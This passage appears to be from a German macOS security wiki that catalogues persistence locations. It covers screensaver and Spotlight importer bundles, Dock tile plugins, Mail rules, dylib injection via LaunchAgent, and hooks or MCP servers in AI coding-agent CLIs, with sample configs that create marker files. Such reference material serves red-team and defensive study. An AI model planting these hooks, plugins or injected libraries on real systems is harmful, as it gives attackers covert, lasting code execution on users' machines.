2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Beachte, dass du dich **innerhalb der allgemeinen App-Sandbox** befindest, da du in den Entitlements der Binärdatei, die diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **`com.apple.security.app-sandbox`** findest.

Bildschirmschoner-Code:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight-Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Allerdings landet man in einer App-Sandbox
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die Sandbox scheint sehr eingeschränkt zu sein

#### Speicherorte

- `~/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
- `/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Root erforderlich
- `/System/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Root erforderlich
- `Some.app/Contents/Library/Spotlight/`
  - **Auslöser**: Eine neue Datei mit einer von dem Spotlight-Plugin verwalteten Erweiterung wird erstellt.
  - Neue App erforderlich

#### Beschreibung und Ausnutzung

Spotlight ist die integrierte Suchfunktion von macOS, die Benutzern **schnellen und umfassenden Zugriff auf Daten auf ihren Computern** ermöglichen soll.\
Um diese schnelle Suche zu ermöglichen, verwaltet Spotlight eine **proprietäre Datenbank** und erstellt einen Index, indem es **die meisten Dateien analysiert**. So lassen sich Dateinamen und Dateiinhalt schnell durchsuchen.<sup>[[25]](#references)</sup>

Der zugrunde liegende Mechanismus von Spotlight umfasst einen zentralen Prozess namens „mds“, kurz für **„metadata server“**. Dieser Prozess steuert den gesamten Spotlight-Dienst. Ergänzend dazu führen mehrere „mdworker“-Daemons verschiedene Wartungsaufgaben aus, etwa das Indizieren unterschiedlicher Dateitypen (`ps -ef | grep mdworker`). Möglich wird dies durch Spotlight-Importer-Plugins oder **„.mdimporter-Bundles**“, mit denen Spotlight Inhalte verschiedenster Dateiformate verstehen und indizieren kann.

Die Plugins oder **`.mdimporter`**-Bundles befinden sich an den zuvor genannten Speicherorten. Ein neues Bundle muss erkannt werden und zu einem Dateityp passen; außerdem muss Spotlight tatsächlich eine passende Datei indizieren. Das bloße Kopieren eines Bundles beweist nicht, dass es geladen wurde. Die [MDImporter-Referenz von Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) verknüpft das Laden mit einer geeigneten geänderten Datei. Die Ausführung von Spotlight-Importern unter macOS 26 wurde hier nicht getestet.

Es ist möglich, **alle geladenen `mdimporters` zu finden**, indem man Folgendes ausführt:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Und zum Beispiel wird **/Library/Spotlight/iBooksAuthor.mdimporter** verwendet, um solche Dateitypen (unter anderem mit den Erweiterungen `.iba` und `.book`) zu analysieren:

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Wenn du die Plist eines anderen `mdimporter` überprüfst, findest du möglicherweise keinen Eintrag **`UTTypeConformsTo`**. Das liegt daran, dass es sich um einen integrierten _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) handelt, für den keine Erweiterungen angegeben werden müssen.
>
> Außerdem haben die standardmäßigen System-Plugins immer Vorrang. Ein Angreifer kann daher nur auf Dateien zugreifen, die nicht bereits von Apples eigenen `mdimporters` indexiert werden.

Um einen eigenen Importer zu erstellen, kannst du mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). Ändere anschließend den Namen und **`CFBundleDocumentTypes`** und füge **`UTImportedTypeDeclarations`** hinzu, damit die gewünschte Erweiterung unterstützt wird. Trage diese außerdem in **`schema.xml`** ein.\
Ändere dann den Code der Funktion **`GetMetadataForFile`**, damit deine Payload ausgeführt wird, wenn eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Zum Schluss **erstelle deinen neuen `.mdimporter` und kopiere ihn** an einen der drei zuvor genannten Speicherorte. Ob er geladen wurde, kannst du **anhand der Logs überwachen** oder mit **`mdimport -L`** überprüfen.

> [!TIP]
> Obwohl die Sandbox des Importers sehr restriktiv ist, indexiert `mdworker` Dateien mit **privilegiertem Lesezugriff**. Ein bösartiger `.mdimporter` kann daher den *Inhalt* von Dateien an TCC-geschützten Speicherorten (Downloads, Pictures, Desktop, …) lesen und gesammelte Metadaten ohne TCC-Abfrage exfiltrieren – der **„Sploitlight“-TCC-Bypass (CVE-2025-31199)**, der in macOS Sequoia 15.4 behoben wurde.<sup>[[55]](#references)</sup>

Informationen zur separaten macOS-26-Technik, geschützte Bytes in **Darwin notification names** statt in System-Logs zu übertragen, findest du unter [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Preference Pane~~

> [!CAUTION]
> Es sieht nicht so aus, als würde das noch funktionieren.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Erfordert eine bestimmte Benutzeraktion
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beschreibung

Es sieht nicht so aus, als würde das noch funktionieren.<sup>[[26]](#references)</sup>

### Application Script Files

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Die Zielanwendung muss jedoch installiert sein und vom Opfer ausgeführt/verwendet werden
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

Ein **interpretiertes Skript, das eine installierte Anwendung oder ein Tool tatsächlich ausführt** und das der Angreifer ändern kann. Überprüfe die Dateiberechtigungen und den aufrufenden Pfad; eine `.sh`- oder `.py`-Datei allein reicht als Nachweis nicht aus. Apples [Code-Signing-Leitfaden](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) besagt, dass signierte App-Bundles Ressourcen, einschließlich Skripten, versiegeln. Änderungen an einem Skript im Bundle brechen diese Versiegelung und können bei der Validierung des Bundles erkannt oder blockiert werden. Ein externes Skript wie der Launcher von Homebrew unterliegt einem anderen Signatur- und Vertrauensverhalten. Zu den historischen Beispielen aus dem Writeup gehören:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – ein Skript, das von älteren Sublime-Text-Versionen verwendet wurde; die Datei und ihre Verwendung beim Start müssen für die installierte Version überprüft werden. Auf dem Test-Mac war sie nicht vorhanden.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) oder **`/usr/local/bin/brew`** (Intel) – ein Bash-Launcher, der ausgeführt wird, wenn der entsprechende `brew`-Pfad aufgerufen wird, sofern er installiert und für den Angreifer beschreibbar ist. Auf dem Test-Mac war `/opt/homebrew/bin/brew` ein beschreibbares Bash-Skript; dies ist eine lokale Beobachtung und keine allgemeine Aussage zu Homebrew-Berechtigungen.
- **IDLEs `idlemain.py`** innerhalb eines Python-App-Bundles – zum Schreiben sind möglicherweise Administratorrechte erforderlich, wird jedoch mit der Identität des IDLE-Benutzers ausgeführt.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – ein historisches Shell-Skript, das mit Root-Rechten ausgeführt wurde, wenn der entsprechende `org.wireshark.ChmodBPF`-launchd-Job installiert ist. Das Skript und der Job waren auf dem Test-Mac nicht vorhanden.

#### Beschreibung & Ausnutzung

Manche Tools und Apps führen zur Laufzeit interpretierte Skripte aus. Ein beschreibbares Skript kann hinzugefügte Befehle ausführen, wenn sein spezifischer Aufrufer das nächste Mal gestartet wird, sofern Signaturvalidierung, Quarantäne und andere Prüfungen dies zulassen. Die ursprüngliche Untersuchung zeigte mehrere Installationen aus dem Jahr 2019; überprüfe ihre Pfade und Auslöser für die jeweilige Zielversion erneut.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Dieser Kopiertest ergab `marker fired: True` unter macOS 26.5.2; der ursprüngliche Launcher blieb unverändert. Er belegt, dass der Einfügepunkt in der Kopie ausgeführt wird, nicht aber, dass ein modifiziertes, signiertes App-Bundle oder eine echte Homebrew-Installation alle Startprüfungen bestehen würde.

### Dock Tile Plugins

Bericht: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert, dass eine App, die das Plug-in deklariert, gefunden/registriert und vom Dock verarbeitet wird
  - Das Plugin wird in einen **Apple-signierten** helper geladen, der keine App-Sandbox-Berechtigung hat und bei dem die **library validation deaktiviert** ist. Dieser helper wurde in der zitierten Untersuchung nicht in der Benutzeroberfläche für Background Task Management angezeigt; die Sichtbarkeit sollte für die jeweilige Zielversion geprüft werden.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, referenziert über den Schlüssel **`NSDockTilePlugIn`** in der `Info.plist` der App; die eigene `Info.plist` des Plugins legt **`NSPrincipalClass`** fest.

#### Beschreibung & Exploitation

Wenn eine App `NSDockTilePlugIn` deklariert, kann das Dock das referenzierte Bundle beim Anmelden oder beim Hinzufügen des App-Symbols in den XPC-helper **`com.apple.dock.external.extra`** laden (`...extra.arm64` auf Apple Silicon); die App selbst muss dafür nicht gestartet werden. Dazu muss die App von macOS gefunden/registriert und akzeptiert werden. Der helper ist **Apple-signiert**, hat keine `com.apple.security.app-sandbox`-Berechtigung und verfügt über `com.apple.security.cs.disable-library-validation`. Die Methode **`setDockTile:`** der Hauptklasse wird beim Laden aufgerufen; von dort aus kann sie verteilte Mitteilungen (z. B. `com.apple.screenIsLocked`) abonnieren, um spätere Ereignisse zu empfangen.<sup>[[38]](#references)</sup>

Unter macOS 26.5.2 bestätigte eine schreibgeschützte `codesign`-Prüfung die Apple-Signatur und die Berechtigungen des helpers; außerdem deklarierten mehrere installierte Apps `NSDockTilePlugIn`. Auf diesem Mac wurde kein neues Plug-in installiert oder geladen, daher ist die Ausführung eines neu geschriebenen Bundles auf dieser Version weiterhin ungetestet.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Die Widget-Erweiterung läuft in ihrem **eigenen Prozess**, und das Hinzufügen einer solchen löst keinen Background Task Management alert aus
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die config plist befindet sich in einem TCC-geschützten Container. Daher erfordert ihre Bearbeitung von außen Full Disk Access oder einen TCC bypass

#### Speicherort

- Widget-Erweiterungs-Bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktive/registrierte Widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (Schlüssel `widgets.instances` und `widgets.widgets`)

#### Beschreibung & Ausnutzung

Eine in einer App enthaltene WidgetKit-Erweiterung läuft in **ihrem eigenen Prozess**, der von Notification Center verwaltet wird. Wenn eine Instanz in `widgets.instances` registriert wird (ein base64-codierter `NSKeyedArchiver`-Blob vom Typ `CHSWidget` mit eingebetteten `INIntent`-Daten) und NotificationCenter neu gestartet wird, wird das Widget geladen und führt seinen `TimelineProvider`-/Intent-Code aus.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app-Regeln (AppleScript ausführen)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Mail.app muss jedoch mit einem konfigurierten Account laufen; der Auslöser ist eine eingehende E-Mail
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
  - Zum Bearbeiten der Regeln/Skripte außerhalb von Mail muss Mail möglicherweise geschlossen sein; bei modernen macOS-Versionen ist außerdem „Vollzugriff auf Festplatte“ erforderlich

#### Speicherort

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (lokale Regeln; `V10` bei Sonoma/Sequoia, `V11`+ bei neueren Versionen)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (mit iCloud synchronisierte Regeln, haben Vorrang)
- Aktivierung der Regeln: **`RulesActiveState.plist`**; AppleScript-Payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Beschreibung & Ausnutzung

Eine Apple-Mail-**Regel** kann die Aktion *„AppleScript ausführen“* enthalten. Fügt man eine Regel hinzu, die auf eine speziell präparierte **Betreffzeile** reagiert und ein Angreifer-Skript ausführt, erhält der Angreifer **unauffällig und aus der Ferne auslösbare** Codeausführung im Kontext von Mail, sobald die präparierte E-Mail eintrifft – ein Vektor, der viele Persistence-Scanner umgeht, da kein LaunchAgent/Login-Objekt erstellt wird.<sup>[[42]](#references)</sup> Wird die Regel so eingestellt, dass sie die Auslöser-E-Mail auch **löscht**, werden die Spuren verborgen. Verteidiger können gezielt danach suchen:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Konfigurationsprofile (.mobileconfig)

Writeup: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle)
  - Moderne macOS-Versionen erfordern eine **manuelle Benutzerfreigabe** in den Systemeinstellungen → *Geräteverwaltung* (`profiles install` ohne Benutzerinteraktion ist außerhalb von MDM nicht mehr möglich)
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Installierte Profile befinden sich unter **`/Library/Managed Preferences/`** und **`/var/db/ConfigurationProfiles/`**; ein Profil ist eine XML-Plist mit einem `PayloadContent`-Array.

#### Beschreibung & Ausnutzung

Eine `.mobileconfig` ist kein direktes Codeausführungs-Primitive, kann aber Konfigurationen wie eine **vertrauenswürdige Root-CA** (`com.apple.security.root`), einen **globalen Proxy oder PAC-Proxy** (`com.apple.proxy.*`), **verwaltete Einstellungen** (`com.apple.ManagedClient.preferences`) oder Einschränkungen dauerhaft speichern. Unter macOS 10.15 und höher besagt Apples Definition von [`PayloadRemovalDisallowed`](https://developer.apple.com/documentation/devicemanagement/toplevel), dass das Entfernen eines **manuell installierten** Profils, bei dem dieser Wert auf `true` gesetzt ist und das kein Payload für ein Entfernungskennwort enthält, eine **Administratorauthentifizierung** erfordert; dadurch wird das Profil nicht absolut unentfernbar. Für per MDM installierte Profile gelten eigene Verwaltungs- und Entfernungsregeln.<sup>[[44]](#references)</sup>

> [!WARNING]
> Ein einfaches Konfigurationsprofil hat **keinen Payload-Typ, der beliebige `LaunchDaemon`/`LaunchAgent` installiert**. Die Installation eines Daemons auf diesem Weg erfordert eine vollständige **MDM-Registrierung** sowie einen Management-Agent bzw. ein Skript — `.mobileconfig` darf nicht als Auslieferungsmechanismus für launchd betrachtet werden.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **entfernt** `DYLD_*` bei SIP-/Platform-Binaries, Apps mit hardened runtime und setuid-Zielen, injiziert also nur in ungeschützte Prozesse und umgeht **nicht** SIP oder die hardened runtime
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Zuverlässige Variante: das **`EnvironmentVariables`**-Dict innerhalb einer schädlichen `LaunchAgent`-/`LaunchDaemon`-plist (wird bei Anmeldung/beim Booten ausgeführt)
- Veraltet (nur der Vollständigkeit halber): **`~/.MacOSX/environment.plist`** (in 10.8 entfernt) und **`/etc/launchd.conf`** (in 10.10 entfernt)

#### Beschreibung & Ausnutzung

Wenn ein Angreifer `DYLD_INSERT_LIBRARIES` in die Umgebung eines Opferprozesses einschleusen kann, lädt dyld die angreiferseitige dylib (ihr Konstruktor wird ausgeführt) in diesen Prozess. Bei der persistenten Variante wird die Variable in einen LaunchAgent eingebettet, sodass jeder Start des Jobs sie erneut injiziert. Beachte, dass `launchctl setenv DYLD_*` auf modernem macOS gefiltert wird. Bette sie daher stattdessen in die plist ein.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Für die vollständige Funktionsweise von dylib injection/hijacking siehe:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLIs (hooks, MCP servers, rules files)

Writeups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Backdoor in der Rules-Datei (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert, dass der Entwickler den betreffenden Agenten verwendet. Startbefehle werden mit den Berechtigungen dieses Benutzers ausgeführt, wenn der Agent dessen Konfiguration akzeptiert; Workspace-Vertrauen und MCP-Genehmigung variieren je nach Produkt und Sitzungsmodus.
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle) (wird als Benutzer ausgeführt; erbt die bereits beim Terminal/Agenten vorhandenen Berechtigungen)

#### Speicherort

Die expliziten Hook- und MCP-Konfigurationsdateien können **Shell-Befehle oder Kindprozesse ausführen, wenn der Entwickler das Tool verwendet** — entweder aus einer globalen Datei pro Benutzer (Persistenz) oder aus einer in einem Repo gespeicherten Datei (Supply-Chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` und Editor-Regeln sind **Anweisungen an einen Agenten** und garantieren nicht, dass beim Lesen Shell-Befehle ausgeführt werden; ihre Wirkung hängt vom Verhalten des Agenten und den Tool-Berechtigungen ab. Prüfen Sie die aktuellen Vertrauens- und Genehmigungsregeln für jedes Produkt.

- **Claude Code**
  - `~/.claude/settings.json`, das Projekt-` .claude/settings.json`, `.claude/settings.local.json` und die nur für root zugängliche **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM-/verwaltete Einstellungen **können vom Benutzer nicht überschrieben werden** → starke Persistenz)
  - Objekt `hooks` — Ereignisse `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — jedes führt einen Shell-Befehl `command` aus
  - `statusLine.command` — ein Shell-Befehl, der zum Rendern der Statuszeile ausgeführt wird (jede Sitzung)
  - MCP-Server in `~/.claude.json` / im Projekt-`.mcp.json` — `command`+`args` werden als Kindprozesse gestartet
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — Anweisungen, die versuchen können, Prompt Injection auszuführen; abhängig vom Verhalten des Agenten und den Tool-Berechtigungen
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` werden als Kindprozesse gestartet); Projektanweisungen in `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP-Server); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … führen Befehle aus); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Beschreibung & Ausnutzung

Kann ein Angreifer die globalen Benutzereinstellungen des Kontos ändern, können dessen Hook- oder MCP-Befehle in zukünftigen Sitzungen unter diesem Konto ausgeführt werden. Eine vom Repository kontrollierte Konfiguration ist ein anderer Fall: Die [aktuellen Sicherheitsdokumente zu Claude Code](https://code.claude.com/docs/en/security) beschreiben einen interaktiven Dialog zum Vertrauen in den Workspace sowie eine separate Genehmigungsabfrage für Projektserver in `.mcp.json`. Laut der [Berechtigungsmatrix](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) können Hooks ausgeführt werden, nachdem einem übergeordneten Ordner vertraut wurde; `claude -p`-/SDK-Sitzungen zeigen keine interaktive Vertrauensabfrage an. In diesen nicht interaktiven Modi verbinden sich Projekt-MCP-Server ohne Genehmigungsabfrage. Die gemeldete Umgehung der Projekt-Hooks vor dem Vertrauen, CVE-2025-59536, wurde [2025 behoben](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); sie sollte nicht als aktuelles Standardverhalten betrachtet werden. Zu den Bereitstellungsvektoren können ein kompromittiertes Repository oder ein bösartiges Installationsprogramm gehören. Prompt Injection über Rules-Dateien ist weniger deterministisch als ein expliziter Hook und hängt weiterhin von den Tool-Genehmigungen ab.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Beispiel für globale Claude-Code-Einstellungen eines Benutzers; verwenden Sie dies beim Testen nur in einem entbehrlichen Konto:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Beispiel für eine benutzerweite Codex-MCP-Konfiguration:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Beispiel für eine Cursor-Hook-Konfiguration; prüfe vor der Verwendung das Schema der installierten Version:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser-Erweiterungen (Chromium: Chrome / Brave / Edge)

Writeup: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [ExtensionInstallForcelist abuse on macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Erfordert einen unterstützten Browser und eine installierte, aktivierte Erweiterung. External Extensions unter macOS erfordern eine Benutzerbestätigung; eine verwaltete Zwangsinstallation erfordert eine zutreffende Enterprise-Richtlinie.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Dies ist etwas anderes als **native messaging hosts** (siehe den Abschnitt *Chrome native messaging hosts* oben). Hier besteht die Persistenz in der **automatisch installierten Erweiterung** selbst.

#### Speicherort

- **External Extensions JSON** (wird beim Browserstart erkannt und erfordert anschließend eine Aktivierungsaufforderung unter macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (pro Benutzer) oder `/Library/Application Support/Google/Chrome/External Extensions/` (alle Benutzer)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Zwangsinstallation über Enterprise-Richtlinie** mithilfe verwalteter Einstellungen / eines Konfigurationsprofils:
  - Schlüssel `ExtensionInstallForcelist` von `com.google.Chrome` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), aus `/Library/Managed Preferences/` oder einer installierten `.mobileconfig` gelesen

#### Beschreibung & Ausnutzung

